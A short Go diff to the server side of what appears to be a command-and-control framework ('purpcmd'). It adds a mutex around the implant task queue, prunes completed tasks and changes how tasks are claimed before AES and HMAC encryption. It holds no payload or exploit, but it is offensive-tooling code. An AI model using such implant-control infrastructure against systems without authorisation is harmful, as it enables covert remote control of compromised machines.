@@ -7,6 +7,7 @@ import (
 	"purpcmd/implant"
 	"purpcmd/internal/encrypt"
 	"purpcmd/server/log"
+	"sync"
 	"time"
 
 	"github.com/cheynewallace/tabby"
@@ -34,6 +35,7 @@ func ImplantNew(name string) *Implant {
 		LastSeen:  n,
 		FirstSeen: n,
 		TaskMap:   make(map[[8]byte]*Task),
+		taskMu:    &sync.Mutex{},
 	}
 }
 
@@ -167,18 +169,22 @@ func ImplantAddUploadTask(code int, name string, data []byte) int {
 }
 
 func (i *Implant) ImplantAddTask(task *Task) {
+	mu := i.taskMutex()
+	mu.Lock()
+	defer mu.Unlock()
+
+	i.pruneCompletedTasksLocked(time.Now())
 	i.Task = append(i.Task, task)
 	i.TaskMap[task.ID] = task
 	log.PrintInfo("new task added: ", string(task.ID[:]))
 }
 
 func (i *Implant) ImplantGetTaskStr() (string, [8]byte, error) {
-	t, err := i.TaskGet()
+	t, err := i.taskClaimAt(time.Now())
 	if err != nil {
 		return "", [8]byte{}, err
 	}
 
-	t.Sent = true
 	tb := t.TaskMarshal()
 	tbe := i.Enc.AESCbcEncrypt(tb)
 	i.Enc.HMACPackAddHmac(&tbe)
